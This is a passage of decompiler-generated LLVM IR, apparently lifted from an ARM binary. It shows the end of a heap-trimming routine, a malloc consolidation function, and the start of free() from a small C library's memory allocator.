dec_label_pc_17570:                               ; preds = %dec_label_pc_17554
  %v0_17570 = load i32, i32* @r7, align 4
  %v1_17570 = sub i32 0, %v0_17570
  store i32 %v1_17570, i32* %r0.global-to-local, align 4
  %v1_17574 = call i32 @__GI_sbrk(i32 %v1_17570)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1757c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1757c, i32* %r0.global-to-local, align 4
  %v7_17580 = icmp eq i32 %v1_1757c, -1
  store i1 %v7_17580, i1* @cpsr_z, align 1
  br i1 %v7_17580, label %dec_label_pc_175b4, label %dec_label_pc_17588

dec_label_pc_17588:                               ; preds = %dec_label_pc_17570
  %v0_17588 = load i32, i32* @r4, align 4
  %v2_17588 = sub i32 %v0_17588, %v1_1757c
  store i32 %v2_17588, i32* %r0.global-to-local, align 4
  %v9_17588 = icmp eq i32 %v0_17588, %v1_1757c
  store i1 %v9_17588, i1* @cpsr_z, align 1
  br i1 %v9_17588, label %dec_label_pc_175b4, label %dec_label_pc_17590

dec_label_pc_17590:                               ; preds = %dec_label_pc_17588
  %v0_17590 = load i32, i32* @r5, align 4
  %v1_17590 = add i32 %v0_17590, 872
  %v2_17590 = inttoptr i32 %v1_17590 to i32*
  %v3_17590 = load i32, i32* %v2_17590, align 4
  %v1_17594 = load i32, i32* @r6, align 4
  %v2_17594 = sub i32 %v1_17594, %v2_17588
  %v1_17598 = add i32 %v0_17590, 44
  %v2_17598 = inttoptr i32 %v1_17598 to i32*
  %v3_17598 = load i32, i32* %v2_17598, align 4
  store i32 %v3_17598, i32* %r1.global-to-local, align 4
  %v2_1759c = sub i32 %v3_17590, %v2_17588
  %v1_175a0 = or i32 %v2_17594, 1
  store i32 %v1_175a0, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1759c, i32* %v2_17590, align 4
  %v0_175ac = load i32, i32* @r2, align 4
  %v1_175ac = load i32, i32* %r1.global-to-local, align 4
  %v2_175ac = add i32 %v1_175ac, 4
  %v3_175ac = inttoptr i32 %v2_175ac to i32*
  store i32 %v0_175ac, i32* %v3_175ac, align 4
  %v1_175c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175b8

dec_label_pc_175b4:                               ; preds = %dec_label_pc_17554, %dec_label_pc_17588, %dec_label_pc_17570, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175b8

dec_label_pc_175b8:                               ; preds = %dec_label_pc_17590, %dec_label_pc_175b4
  %v1_175c0 = phi i32 [ %v1_175c0.pre, %dec_label_pc_17590 ], [ 0, %dec_label_pc_175b4 ]
  store i32 %v9_17518, i32* @r6, align 4
  store i32 %v12_17518, i32* @r7, align 4
  ret i32 %v1_175c0

; uselistorder directives
  uselistorder i1 %v7_17580, { 1, 0 }
  uselistorder i32 %v1_1757c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_17520, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_175b8, { 1, 0 }
  uselistorder label %dec_label_pc_175b4, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_175c4 = load i32, i32* @r4, align 4
  store i32 %v3_175c4, i32* %stack_var_-36, align 4
  %v0_175c8 = load i32, i32* @r0, align 4
  %v1_175c8 = inttoptr i32 %v0_175c8 to i32*
  %v2_175c8 = load i32, i32* %v1_175c8, align 4
  store i32 %v2_175c8, i32* %r3.global-to-local, align 4
  %v2_175cc = icmp eq i32 %v2_175c8, 0
  store i32 %v0_175c8, i32* @r4, align 4
  br i1 %v2_175cc, label %dec_label_pc_17704.preheader, label %dec_label_pc_175e0

dec_label_pc_17704.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1770c25 = add i32 %v0_175c8, 52
  store i32 %v1_1770c25, i32* %r3.global-to-local, align 4
  %v2_1771426 = add i32 %v0_175c8, 60
  %v3_1771427 = inttoptr i32 %v2_1771426 to i32*
  store i32 %v1_1770c25, i32* %v3_1771427, align 4
  %v0_1771828 = load i32, i32* %r3.global-to-local, align 4
  %v2_1771829 = add i32 %v0_1771828, 12
  %v3_1771830 = inttoptr i32 %v2_1771829 to i32*
  store i32 %v0_1771828, i32* %v3_1771830, align 4
  br label %dec_label_pc_17704.dec_label_pc_17704_crit_edge

dec_label_pc_175e0:                               ; preds = %entry
  %v1_175e0 = and i32 %v2_175c8, -3
  %v3_175e4 = udiv i32 %v2_175c8, 8
  store i32 %v3_175e4, i32* %r2.global-to-local, align 4
  store i32 %v1_175e0, i32* %v1_175c8, align 4
  %v0_175ec = load i32, i32* @r0, align 4
  %v1_175ec = add i32 %v0_175ec, -4
  store i32 %v1_175ec, i32* %r3.global-to-local, align 4
  %v1_175f0 = load i32, i32* %r2.global-to-local, align 4
  %v4_175f0 = mul i32 %v1_175f0, 4
  %v5_175f0 = add i32 %v4_175f0, %v1_175ec
  store i32 %v5_175f0, i32* %sb.global-to-local, align 4
  %v1_175f4 = add i32 %v0_175ec, 52
  store i32 %v1_175f4, i32* %r7.global-to-local, align 4
  %v1_175f8 = add i32 %v0_175ec, 4
  store i32 %v1_175f8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17600

dec_label_pc_17600:                               ; preds = %dec_label_pc_176fc, %dec_label_pc_175e0
  %v1_176f410 = phi i32 [ %v1_176f4, %dec_label_pc_176fc ], [ %v5_175f0, %dec_label_pc_175e0 ]
  %v1_1760c = phi i32 [ %v1_176fc, %dec_label_pc_176fc ], [ %v1_175f8, %dec_label_pc_175e0 ]
  %v1_17600 = inttoptr i32 %v1_1760c to i32*
  %v2_17600 = load i32, i32* %v1_17600, align 4
  store i32 %v2_17600, i32* %r1.global-to-local, align 4
  %v2_17604 = icmp eq i32 %v2_17600, 0
  br i1 %v2_17604, label %dec_label_pc_176f4, label %dec_label_pc_1760c

dec_label_pc_1760c:                               ; preds = %dec_label_pc_17600
  %v0_1760c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1760c, i32* %v1_17600, align 4
  %v0_17610.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17610

dec_label_pc_17610:                               ; preds = %dec_label_pc_176e8, %dec_label_pc_1760c
  %v0_1762c = phi i32 [ %v0_176e8, %dec_label_pc_176e8 ], [ %v0_17610.pre, %dec_label_pc_1760c ]
  %v1_17610 = add i32 %v0_1762c, 4
  %v2_17610 = inttoptr i32 %v1_17610 to i32*
  %v3_17610 = load i32, i32* %v2_17610, align 4
  store i32 %v3_17610, i32* %r3.global-to-local, align 4
  %v1_17614 = and i32 %v3_17610, -2
  store i32 %v1_17614, i32* %lr.global-to-local, align 4
  %v2_17618 = add i32 %v1_17614, %v0_1762c
  store i32 %v2_17618, i32* @r0, align 4
  %v1_1761c = urem i32 %v3_17610, 2
  %v2_1761c = icmp eq i32 %v1_1761c, 0
  %v1_17620 = add i32 %v0_1762c, 8
  %v2_17620 = inttoptr i32 %v1_17620 to i32*
  %v3_17620 = load i32, i32* %v2_17620, align 4
  store i32 %v3_17620, i32* %sl.global-to-local, align 4
  %v1_17624 = add i32 %v2_17618, 4
  %v2_17624 = inttoptr i32 %v1_17624 to i32*
  %v3_17624 = load i32, i32* %v2_17624, align 4
  store i32 %v3_17624, i32* %r8.global-to-local, align 4
  br i1 %v2_1761c, label %dec_label_pc_1762c, label %dec_label_pc_17660

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17610
  %v1_1762c = inttoptr i32 %v0_1762c to i32*
  %v2_1762c = load i32, i32* %v1_1762c, align 4
  store i32 %v2_1762c, i32* %r5.global-to-local, align 4
  %v2_17630 = sub i32 %v0_1762c, %v2_1762c
  store i32 %v2_17630, i32* %r3.global-to-local, align 4
  %v1_17634 = add i32 %v2_17630, 8
  %v2_17634 = inttoptr i32 %v1_17634 to i32*
  %v3_17634 = load i32, i32* %v2_17634, align 4
  store i32 %v3_17634, i32* @ip, align 4
  %v1_17638 = add i32 %v3_17634, 12
  %v2_17638 = inttoptr i32 %v1_17638 to i32*
  %v3_17638 = load i32, i32* %v2_17638, align 4
  store i32 %v3_17638, i32* %r1.global-to-local, align 4
  %v9_1763c = icmp eq i32 %v3_17638, %v2_17630
  %v1_17640 = add i32 %v2_17630, 12
  %v2_17640 = inttoptr i32 %v1_17640 to i32*
  %v3_17640 = load i32, i32* %v2_17640, align 4
  store i32 %v3_17640, i32* %r2.global-to-local, align 4
  br i1 %v9_1763c, label %dec_label_pc_17648, label %dec_label_pc_176a4

dec_label_pc_17648:                               ; preds = %dec_label_pc_1762c
  %v1_17648 = add i32 %v3_17640, 8
  %v2_17648 = inttoptr i32 %v1_17648 to i32*
  %v3_17648 = load i32, i32* %v2_17648, align 4
  store i32 %v3_17648, i32* %r3.global-to-local, align 4
  %v9_1764c = icmp eq i32 %v3_17648, %v2_17630
  br i1 %v9_1764c, label %dec_label_pc_17654, label %dec_label_pc_176a4

dec_label_pc_17654:                               ; preds = %dec_label_pc_17648
  store i32 %v3_17634, i32* %v2_17648, align 4
  %v0_17658 = load i32, i32* %r2.global-to-local, align 4
  %v1_17658 = load i32, i32* @ip, align 4
  %v2_17658 = add i32 %v1_17658, 12
  %v3_17658 = inttoptr i32 %v2_17658 to i32*
  store i32 %v0_17658, i32* %v3_17658, align 4
  %v0_1765c = load i32, i32* %lr.global-to-local, align 4
  %v1_1765c = load i32, i32* %r5.global-to-local, align 4
  %v2_1765c = add i32 %v1_1765c, %v0_1765c
  store i32 %v2_1765c, i32* %lr.global-to-local, align 4
  %v0_17664.pre = load i32, i32* @r0, align 4
  %v0_17668.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_17660:                               ; preds = %dec_label_pc_17610, %dec_label_pc_17654
  %v0_176d8 = phi i32 [ %v1_17614, %dec_label_pc_17610 ], [ %v2_1765c, %dec_label_pc_17654 ]
  %v0_17668 = phi i32 [ %v3_17624, %dec_label_pc_17610 ], [ %v0_17668.pre, %dec_label_pc_17654 ]
  %v1_1767c = phi i32 [ %v2_17618, %dec_label_pc_17610 ], [ %v0_17664.pre, %dec_label_pc_17654 ]
  %v0_17660 = load i32, i32* @r4, align 4
  %v1_17660 = add i32 %v0_17660, 44
  %v2_17660 = inttoptr i32 %v1_17660 to i32*
  %v3_17660 = load i32, i32* %v2_17660, align 4
  store i32 %v3_17660, i32* %r3.global-to-local, align 4
  %v9_17664 = icmp eq i32 %v1_1767c, %v3_17660
  %v1_17668 = and i32 %v0_17668, -4
  store i32 %v1_17668, i32* %r5.global-to-local, align 4
  br i1 %v9_17664, label %dec_label_pc_176d8, label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_17660
  %v2_17670 = add i32 %v1_1767c, %v1_17668
  store i32 %v2_17670, i32* %r3.global-to-local, align 4
  %v1_17674 = add i32 %v2_17670, 4
  %v2_17674 = inttoptr i32 %v1_17674 to i32*
  %v3_17674 = load i32, i32* %v2_17674, align 4
  store i32 %v3_17674, i32* %r3.global-to-local, align 4
  %v1_17678 = urem i32 %v3_17674, 2
  %v2_17678 = icmp eq i32 %v1_17678, 0
  %v2_1767c = add i32 %v1_1767c, 4
  %v3_1767c = inttoptr i32 %v2_1767c to i32*
  store i32 %v1_17668, i32* %v3_1767c, align 4
  br i1 %v2_17678, label %dec_label_pc_17684, label %dec_label_pc_17670.dec_label_pc_176b4_crit_edge

dec_label_pc_17670.dec_label_pc_176b4_crit_edge:  ; preds = %dec_label_pc_17670
  %v0_176b8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_17684:                               ; preds = %dec_label_pc_17670
  %v0_17684 = load i32, i32* @r0, align 4
  %v1_17684 = add i32 %v0_17684, 8
  %v2_17684 = inttoptr i32 %v1_17684 to i32*
  %v3_17684 = load i32, i32* %v2_17684, align 4
  store i32 %v3_17684, i32* @ip, align 4
  %v1_17688 = add i32 %v3_17684, 12
  %v2_17688 = inttoptr i32 %v1_17688 to i32*
  %v3_17688 = load i32, i32* %v2_17688, align 4
  store i32 %v3_17688, i32* %r3.global-to-local, align 4
  %v9_1768c = icmp eq i32 %v3_17688, %v0_17684
  %v1_17690 = add i32 %v0_17684, 12
  %v2_17690 = inttoptr i32 %v1_17690 to i32*
  %v3_17690 = load i32, i32* %v2_17690, align 4
  store i32 %v3_17690, i32* %r2.global-to-local, align 4
  br i1 %v9_1768c, label %dec_label_pc_17698, label %dec_label_pc_176a4

dec_label_pc_17698:                               ; preds = %dec_label_pc_17684
  %v1_17698 = add i32 %v3_17690, 8
  %v2_17698 = inttoptr i32 %v1_17698 to i32*
  %v3_17698 = load i32, i32* %v2_17698, align 4
  store i32 %v3_17698, i32* %r3.global-to-local, align 4
  %v9_1769c = icmp eq i32 %v3_17698, %v0_17684
  br i1 %v9_1769c, label %dec_label_pc_176a8, label %dec_label_pc_176a4

dec_label_pc_176a4:                               ; preds = %dec_label_pc_17684, %dec_label_pc_17648, %dec_label_pc_1762c, %dec_label_pc_17698
  %v0_176a4 = call i32 @abort()
  store i32 %v0_176a4, i32* @r0, align 4
  %v0_176a8.pre = load i32, i32* @ip, align 4
  %v1_176a8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_176a8

dec_label_pc_176a8:                               ; preds = %dec_label_pc_17698, %dec_label_pc_176a4
  %v1_176a8 = phi i32 [ %v3_17690, %dec_label_pc_17698 ], [ %v1_176a8.pre, %dec_label_pc_176a4 ]
  %v0_176a8 = phi i32 [ %v3_17684, %dec_label_pc_17698 ], [ %v0_176a8.pre, %dec_label_pc_176a4 ]
  %v2_176a8 = add i32 %v1_176a8, 8
  %v3_176a8 = inttoptr i32 %v2_176a8 to i32*
  store i32 %v0_176a8, i32* %v3_176a8, align 4
  %v0_176ac = load i32, i32* %r2.global-to-local, align 4
  %v1_176ac = load i32, i32* @ip, align 4
  %v2_176ac = add i32 %v1_176ac, 12
  %v3_176ac = inttoptr i32 %v2_176ac to i32*
  store i32 %v0_176ac, i32* %v3_176ac, align 4
  %v0_176b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_176b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_176b0 = add i32 %v1_176b0, %v0_176b0
  store i32 %v2_176b0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_17670.dec_label_pc_176b4_crit_edge, %dec_label_pc_176a8
  %v0_176b8 = phi i32 [ %v0_176b8.pre, %dec_label_pc_17670.dec_label_pc_176b4_crit_edge ], [ %v2_176b0, %dec_label_pc_176a8 ]
  %v0_176b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_176b4 = add i32 %v0_176b4, 8
  %v2_176b4 = inttoptr i32 %v1_176b4 to i32*
  %v3_176b4 = load i32, i32* %v2_176b4, align 4
  store i32 %v3_176b4, i32* %r2.global-to-local, align 4
  %v1_176b8 = or i32 %v0_176b8, 1
  store i32 %v1_176b8, i32* %r3.global-to-local, align 4
  %v0_176bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_176bc, i32* %v2_176b4, align 4
  %v0_176c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_176c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_176c0 = add i32 %v1_176c0, 12
  %v3_176c0 = inttoptr i32 %v2_176c0 to i32*
  store i32 %v0_176c0, i32* %v3_176c0, align 4
  %v0_176c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_176c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_176c4 = add i32 %v1_176c4, %v0_176c4
  %v4_176c4 = inttoptr i32 %v3_176c4 to i32*
  store i32 %v0_176c4, i32* %v4_176c4, align 4
  %v0_176c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_176c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_176c8 = add i32 %v1_176c8, 4
  %v3_176c8 = inttoptr i32 %v2_176c8 to i32*
  store i32 %v0_176c8, i32* %v3_176c8, align 4
  %v0_176cc = load i32, i32* %r2.global-to-local, align 4
  %v1_176cc = load i32, i32* %r1.global-to-local, align 4
  %v2_176cc = add i32 %v1_176cc, 8
  %v3_176cc = inttoptr i32 %v2_176cc to i32*
  store i32 %v0_176cc, i32* %v3_176cc, align 4
  %v0_176d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_176d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_176d0 = add i32 %v1_176d0, 12
  %v3_176d0 = inttoptr i32 %v2_176d0 to i32*
  store i32 %v0_176d0, i32* %v3_176d0, align 4
  br label %dec_label_pc_176e8

dec_label_pc_176d8:                               ; preds = %dec_label_pc_17660
  %v2_176d8 = add i32 %v1_17668, %v0_176d8
  %v1_176dc = or i32 %v2_176d8, 1
  store i32 %v1_176dc, i32* %r3.global-to-local, align 4
  %v1_176e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_176e0 = add i32 %v1_176e0, 4
  %v3_176e0 = inttoptr i32 %v2_176e0 to i32*
  store i32 %v1_176dc, i32* %v3_176e0, align 4
  %v0_176e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_176e4 = load i32, i32* @r4, align 4
  %v2_176e4 = add i32 %v1_176e4, 44
  %v3_176e4 = inttoptr i32 %v2_176e4 to i32*
  store i32 %v0_176e4, i32* %v3_176e4, align 4
  br label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_176d8
  %v0_176e8 = load i32, i32* %sl.global-to-local, align 4
  %v2_176e8 = icmp eq i32 %v0_176e8, 0
  store i32 %v0_176e8, i32* %r1.global-to-local, align 4
  br i1 %v2_176e8, label %dec_label_pc_176f4.loopexit, label %dec_label_pc_17610

dec_label_pc_176f4.loopexit:                      ; preds = %dec_label_pc_176e8
  %v0_176f4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_176f4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_176f4

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176f4.loopexit, %dec_label_pc_17600
  %v1_176f4 = phi i32 [ %v1_176f4.pre, %dec_label_pc_176f4.loopexit ], [ %v1_176f410, %dec_label_pc_17600 ]
  %v0_176fc = phi i32 [ %v0_176f4.pre, %dec_label_pc_176f4.loopexit ], [ %v1_1760c, %dec_label_pc_17600 ]
  %v9_176f4 = icmp eq i32 %v0_176fc, %v1_176f4
  br i1 %v9_176f4, label %dec_label_pc_1776c, label %dec_label_pc_176fc

dec_label_pc_176fc:                               ; preds = %dec_label_pc_176f4
  %v1_176fc = add i32 %v0_176fc, 4
  store i32 %v1_176fc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17600

dec_label_pc_17704.dec_label_pc_17704_crit_edge:  ; preds = %dec_label_pc_17704.preheader, %dec_label_pc_17704.dec_label_pc_17704_crit_edge
  %v0_17704.pre = load i32, i32* @r4, align 4
  %v1_17704.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_17704 = mul i32 %v1_17704.pre, 8
  %v5_17704 = add i32 %v4_17704, %v0_17704.pre
  %v1_17708 = add i32 %v1_17704.pre, 1
  store i32 %v1_17708, i32* %r2.global-to-local, align 4
  %v1_1770c = add i32 %v5_17704, 44
  store i32 %v1_1770c, i32* %r3.global-to-local, align 4
  %v2_17714 = add i32 %v5_17704, 52
  %v3_17714 = inttoptr i32 %v2_17714 to i32*
  store i32 %v1_1770c, i32* %v3_17714, align 4
  %v0_17718 = load i32, i32* %r3.global-to-local, align 4
  %v2_17718 = add i32 %v0_17718, 12
  %v3_17718 = inttoptr i32 %v2_17718 to i32*
  store i32 %v0_17718, i32* %v3_17718, align 4
  %v7_1771c = icmp sgt i32 %v1_17708, 95
  br i1 %v7_1771c, label %dec_label_pc_17720, label %dec_label_pc_17704.dec_label_pc_17704_crit_edge

dec_label_pc_17720:                               ; preds = %dec_label_pc_17704.dec_label_pc_17704_crit_edge
  %v0_17720 = load i32, i32* @r4, align 4
  %v1_17720 = inttoptr i32 %v0_17720 to i32*
  %v2_17720 = load i32, i32* %v1_17720, align 4
  store i32 %v2_17720, i32* %r2.global-to-local, align 4
  %v1_17724 = add i32 %v0_17720, 864
  %v2_17724 = inttoptr i32 %v1_17724 to i32*
  %v3_17724 = load i32, i32* %v2_17724, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1772c = urem i32 %v2_17720, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_17734 = or i32 %v3_17724, 1
  store i32 %v1_17734, i32* %r1.global-to-local, align 4
  %v1_17738 = or i32 %v1_1772c, 72
  store i32 %v1_17738, i32* %r2.global-to-local, align 4
  %v1_1773c = add i32 %v0_17720, 52
  store i32 %v1_1773c, i32* @ip, align 4
  %v2_17740 = add i32 %v0_17720, 840
  %v3_17740 = inttoptr i32 %v2_17740 to i32*
  store i32 0, i32* %v3_17740, align 4
  %v0_17744 = load i32, i32* %r3.global-to-local, align 4
  %v1_17744 = add i32 %v0_17744, 65536
  store i32 %v1_17744, i32* %r3.global-to-local, align 4
  %v0_17748 = load i32, i32* %r0.global-to-local, align 4
  %v1_17748 = load i32, i32* @r4, align 4
  %v2_17748 = add i32 %v1_17748, 836
  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  store i32 %v0_17748, i32* %v3_17748, align 4
  %v0_1774c = load i32, i32* %r0.global-to-local, align 4
  %v1_1774c = load i32, i32* @r4, align 4
  %v2_1774c = add i32 %v1_1774c, 844
  %v3_1774c = inttoptr i32 %v2_1774c to i32*
  store i32 %v0_1774c, i32* %v3_1774c, align 4
  %v1_17750 = load i32, i32* @r4, align 4
  %v2_17750 = add i32 %v1_17750, 852
  %v3_17750 = inttoptr i32 %v2_17750 to i32*
  store i32 %v1_17744, i32* %v3_17750, align 4
  %v1_17754 = load i32, i32* @r4, align 4
  %v2_17754 = add i32 %v1_17754, 864
  %v3_17754 = inttoptr i32 %v2_17754 to i32*
  store i32 %v1_17734, i32* %v3_17754, align 4
  %v1_17758 = load i32, i32* @r4, align 4
  %v2_17758 = inttoptr i32 %v1_17758 to i32*
  store i32 %v1_17738, i32* %v2_17758, align 4
  %v0_1775c = load i32, i32* @ip, align 4
  %v1_1775c = load i32, i32* @r4, align 4
  %v2_1775c = add i32 %v1_1775c, 44
  %v3_1775c = inttoptr i32 %v2_1775c to i32*
  store i32 %v0_1775c, i32* %v3_1775c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_17764 = call i32 @sysconf(i32 30, i32 %v1_17734, i32 %v1_17738, i32 %v1_17744)
  store i32 %v4_17764, i32* @r0, align 4
  %v1_17768 = load i32, i32* @r4, align 4
  %v2_17768 = add i32 %v1_17768, 860
  %v3_17768 = inttoptr i32 %v2_17768 to i32*
  store i32 %v4_17764, i32* %v3_17768, align 4
  br label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %dec_label_pc_176f4, %dec_label_pc_17720
  %v2_17770 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17770, i32* @r4, align 4
  %v1_17774 = load i32, i32* @r0, align 4
  ret i32 %v1_17774

; uselistorder directives
  uselistorder i32 %v0_17720, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17718, { 1, 0 }
  uselistorder i32 %v1_176fc, { 1, 0 }
  uselistorder i32 %v0_176e8, { 0, 2, 1 }
  uselistorder i32 %v0_176c4, { 1, 0 }
  uselistorder i32 %v1_17614, { 1, 0, 2 }
  uselistorder i32 %v0_1762c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_175ec, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 5, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1776c, { 1, 0 }
  uselistorder label %dec_label_pc_17704.dec_label_pc_17704_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_176e8, { 1, 0 }
  uselistorder label %dec_label_pc_176b4, { 1, 0 }
  uselistorder label %dec_label_pc_176a8, { 1, 0 }
  uselistorder label %dec_label_pc_176a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17660, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_17778 = load i32, i32* @r4, align 4
  %v6_17778 = load i32, i32* @r5, align 4
  %v9_17778 = load i32, i32* @r6, align 4
  %v12_17778 = load i32, i32* @r7, align 4
  %v18_17778 = load i32, i32* @lr, align 4
  %v0_17780 = load i32, i32* @r0, align 4
  store i32 %v0_17780, i32* @r6, align 4
  %v2_17780 = icmp eq i32 %v0_17780, 0
  %v2_17784 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r7, align 4
  br i1 %v2_17780, label %dec_label_pc_1798c, label %dec_label_pc_17790

dec_label_pc_17790:                               ; preds = %entry
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_17794 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 120) to i32*), align 4
  store i32 %v4_17794, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 %v4_17794, i32* %r2.global-to-local, align 4
  %v4_177a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 76) to i32*), align 4
  store i32 %v4_177a0, i32* %r1.global-to-local, align 4
  store i32 %v2_17784, i32* %r0.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v4_177ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  store i32 %v4_177ac, i32* %ip.global-to-local, align 4
  store i32 96184, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_177ac)
  %v0_177b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_177b8, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_177c0 = load i32, i32* @r7, align 4
  %v2_177c0 = add i32 %v0_177c0, 20
  %v3_177c0 = inttoptr i32 %v2_177c0 to i32*
  %v4_177c0 = load i32, i32* %v3_177c0, align 4
  store i32 %v4_177c0, i32* %ip.global-to-local, align 4
  store i32 96204, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_177c0)
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_177d0 = load i32, i32* @r7, align 4
  %v2_177d0 = add i32 %v0_177d0, 72
  %v3_177d0 = inttoptr i32 %v2_177d0 to i32*
  %v4_177d0 = load i32, i32* %v3_177d0, align 4
  store i32 %v4_177d0, i32* @lr, align 4
  %v0_177d4 = load i32, i32* @r6, align 4
  %v1_177d4 = add i32 %v0_177d4, -4
  %v2_177d4 = inttoptr i32 %v1_177d4 to i32*
  %v3_177d4 = load i32, i32* %v2_177d4, align 4
  store i32 %v3_177d4, i32* %r2.global-to-local, align 4
  %v1_177d8 = inttoptr i32 %v4_177d0 to i32*
  %v2_177d8 = load i32, i32* %v1_177d8, align 4
  store i32 %v2_177d8, i32* %r3.global-to-local, align 4
  %v1_177dc = and i32 %v3_177d4, -4
  store i32 %v1_177dc, i32* %ip.global-to-local, align 4
  %v1_177e0 = add i32 %v0_177d4, -8
  store i32 %v1_177e0, i32* @r5, align 4
  store i32 %v1_177e0, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_177dc, %v2_177d8
  br i1 %tmp, label %dec_label_pc_17810, label %dec_label_pc_177f0

dec_label_pc_177f0:                               ; preds = %dec_label_pc_17790
  %v1_177f0 = or i32 %v2_177d8, 3
  store i32 %v1_177f0, i32* %r3.global-to-local, align 4
  store i32 %v1_177f0, i32* %v1_177d8, align 4
  %v3_177f4 = load i32, i32* @lr, align 4
  %v4_177f4 = add i32 %v3_177f4, -8
  store i32 %v4_177f4, i32* %lr.global-to-local, align 4
  %v0_177f8 = load i32, i32* %ip.global-to-local, align 4
  %v3_177f8 = udiv i32 %v0_177f8, 8
  store i32 %v3_177f8, i32* %r1.global-to-local, align 4
